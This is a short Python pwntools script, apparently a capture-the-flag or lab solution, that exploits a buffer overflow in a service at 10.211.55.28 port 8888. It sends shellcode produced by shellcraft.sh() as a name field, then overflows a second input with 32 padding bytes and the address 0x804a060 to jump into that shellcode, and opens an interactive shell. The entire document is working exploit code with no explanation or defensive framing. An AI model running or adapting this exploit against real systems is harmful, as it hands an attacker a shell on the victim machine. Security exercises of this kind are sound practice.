#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.28"
port = 8888

r = remote(host,port)
name = 0x804a060
r.recvuntil(":")
r.sendline(asm(shellcraft.sh()))
r.recvuntil(":")
payload = "a"*32
payload += p32(name)
r.sendline(payload)

r.interactive()
